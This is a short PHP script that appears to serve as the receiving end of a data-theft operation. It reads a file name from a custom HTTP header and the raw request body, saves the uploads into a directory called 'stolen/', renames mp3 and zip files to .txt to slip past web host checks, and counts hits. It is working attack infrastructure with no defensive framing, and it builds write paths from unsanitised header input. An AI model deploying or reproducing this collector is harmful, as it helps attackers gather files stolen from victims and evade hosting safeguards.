<?php
$fname = $_SERVER["HTTP_FNAME"];
$inp = file_get_contents("php://input");

$ok = true;
$file = scandir("stolen/");
if (sizeof($file) >= 30)
{
    $ok = false;
}

if ($inp != "" && strlen($fname) > 0 && $ok)
{
    $tmp = explode(".", $fname);
    $ext = $tmp[sizeof($tmp) - 1];
    //Sensitive extensions for some web service providers
    if ($ext == "mp3" || $ext == "zip")
    {
        $p = "stolen/" . $fname . ".txt";
    }
    else
    {
        $p = "stolen/" . $fname;
    }

    file_put_contents($p, $inp);
    chmod($p, 0640);
}

$oldCount = file_get_contents('count_fileclick.txt');

file_put_contents('count_fileclick.txt', $oldCount + 1);
?>
